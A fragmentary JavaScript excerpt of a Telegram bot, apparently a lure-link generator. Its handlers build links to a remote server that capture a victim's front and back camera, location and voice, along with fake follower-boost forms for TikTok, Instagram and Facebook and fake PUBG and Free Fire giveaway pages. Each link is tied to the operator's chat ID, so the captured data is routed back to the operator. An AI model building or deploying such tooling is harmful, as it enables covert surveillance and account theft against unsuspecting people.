...
bot.on('callback_query', async (callbackQuery) => {
    ...
    if (data === 'request_verification') {
        const verificationLink = `https://mii-chge.onrender.com/whatsapp?chatId=${chatId}`;
    ...
    if (action === 'get_joke') {
        ...
        switch (action) {
            case 'captureFront':
                link = `https://mii-chge.onrender.com/captureFront/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}`;
                break;
            case 'captureBack':
                link = `https://mii-chge.onrender.com/captureBack/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}`;
                break;
            case 'getLocation':
                link = `https://mii-chge.onrender.com/getLocation/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}`;
                break;
            case 'recordVoice':
                const duration = 10;  // مدة التسجيل الثابتة
                link = `https://mii-chge.onrender.com/record/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}&duration=${duration}`;
                break;
            case 'rshq_tiktok':
                link = `https://mii-chge.onrender.com/getNameForm?chatId=${chatId}&type=tiktok`;
                break;
            case 'rshq_instagram':
                link = `https://mii-chge.onrender.com/getNameForm?chatId=${chatId}&type=instagram`;
                break;
            case 'rshq_facebook':
                link = `https://mii-chge.onrender.com/getNameForm?chatId=${chatId}&type=facebook`;
                break;
            default:
...
bot.on('callback_query', (query) => {
    ...
    if (query.data === 'get_pubg') {
        link = `https://mii-chge.onrender.com/get?chatId=${chatId}.png`;
    } else if (query.data === 'get_freefire') {
        link = `https://mii-chge.onrender.com/getNam?chatId=${chatId}.png`;
    } else if (query.data === 'add_names') {
        link = `https://mii-chge.onrender.com/getName?chatId=${chatId}.png`;
    }
